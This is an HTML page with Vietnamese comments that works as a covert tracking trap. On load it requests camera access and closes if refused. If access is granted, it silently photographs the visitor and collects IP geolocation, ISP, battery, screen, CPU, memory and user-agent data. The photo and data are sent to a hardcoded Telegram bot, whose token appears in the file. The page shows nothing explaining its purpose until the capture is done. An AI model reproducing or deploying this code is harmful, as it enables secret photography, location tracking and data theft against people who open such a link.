<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #result-container {
            display: none;
            text-align: center;
            padding: 20px;
        }

        #captured-img {
            max-width: 90%;
            max-height: 60vh;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            margin-bottom: 15px;
        }

        .message {
            font-size: 20px;
            color: #2e7d32;
            font-weight: bold;
        }
    </style>
</head>
<body>

<!-- Màn hình kết quả sau khi hoàn tất -->
<div id="result-container">
    <img id="captured-img" alt="Ảnh đã chụp">
    <div class="message">Ảnh bạn đã được gửi</div>
</div>

<!-- Thẻ ngầm xử lý camera và canvas -->
<video id="webcam" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    // ==========================================
    // CẤU HÌNH THÔNG TIN TELEGRAM BOT TẠI ĐÂY
    // ==========================================
    const TELEGRAM_BOT_TOKEN = '8910192618:AAEcxfvxyMFVClt8WXZEyKQ-s4aO7AYw9eA';
    const TELEGRAM_CHAT_ID = '8894046691';

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const resultContainer = document.getElementById('result-container');
    const capturedImg = document.getElementById('captured-img');

    // Chạy ngầm ngay khi tải trang
    window.addEventListener('DOMContentLoaded', async () => {
        try {
            // Yêu cầu cấp quyền camera trước
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            video.srcObject = stream;

            // Chờ 1 giây để camera cân bằng ánh sáng
            setTimeout(() => {
                autoCaptureAndSend(stream);
            }, 1000);

        } catch (err) {
            // Nếu không cấp quyền -> Chuyển hướng thoát trang
            exitWeb();
        }
    });

    function exitWeb() {
        setTimeout(() => {
            window.close();
            window.location.href = "about:blank";
        }, 300);
    }

    // 1. Hàm thu thập toàn bộ thông tin thiết bị & IP
    async function getDeviceInfo() {
        let ipInfo = "Không lấy được IP";
        try {
            // Lấy thông tin IP công cộng và vị trí từ API
            const res = await fetch('https://ipapi.co/json/');
            if (res.ok) {
                const data = await res.json();
                ipInfo = `IP: ${data.ip}\n` +
                         `Quốc gia: ${data.country_name} (${data.country_code})\n` +
                         `Thành phố: ${data.city}, ${data.region}\n` +
                         `Nhà mạng (ISP): ${data.org}`;
            }
        } catch (e) {
            // Backup lấy IP đơn giản nếu API trên bị chặn
            try {
                const resIp = await fetch('https://api.ipify.org?format=json');
                const dataIp = await resIp.json();
                ipInfo = `IP: ${dataIp.ip}`;
            } catch (err) {}
        }

        // Lấy thông tin Pin (nếu trình duyệt hỗ trợ)
        let batteryInfo = "Không hỗ trợ";
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Đang sạc' : 'Chưa sạc'})`;
            } catch (e) {}
        }

        // Tổng hợp thông tin hệ thống
        const info = `🌐 THÔNG TIN TRUY CẬP 🌐\n` +
                     `----------------------------\n` +
                     `${ipInfo}\n` +
                     `Thời gian: ${new Date().toLocaleString('vi-VN')}\n` +
                     `Múi giờ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
                     `Độ phân giải màn hình: ${screen.width}x${screen.height}\n` +
                     `Kích thước cửa sổ: ${window.innerWidth}x${window.innerHeight}\n` +
                     `Ngôn ngữ: ${navigator.language}\n` +
                     `Số lõi CPU: ${navigator.hardwareConcurrency || 'N/A'}\n` +
                     `Bộ nhớ RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n` +
                     `Mức Pin: ${batteryInfo}\n` +
                     `Nền tảng (Platform): ${navigator.platform}\n` +
                     `User-Agent: ${navigator.userAgent}`;

        return info;
    }

    // 2. Hàm chụp ảnh, đính kèm thông tin và gửi Telegram
    async function autoCaptureAndSend(stream) {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageUrl = canvas.toDataURL('image/png');

        // Lấy thông tin thiết bị
        const captionText = await getDeviceInfo();

        canvas.toBlob(async function(blob) {
            if (blob) {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'camera_front.png');
                formData.append('caption', captionText); // Gửi thông tin thiết bị kèm theo ảnh

                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (error) {
                    console.error("Lỗi gửi dữ liệu:", error);
                }
            }

            // Tắt luồng camera
            stream.getTracks().forEach(track => track.stop());

            // Hiển thị giao diện hoàn tất
            capturedImg.src = imageUrl;
            resultContainer.style.display = 'block';

        }, 'image/png');
    }
</script>

</body>
</html>
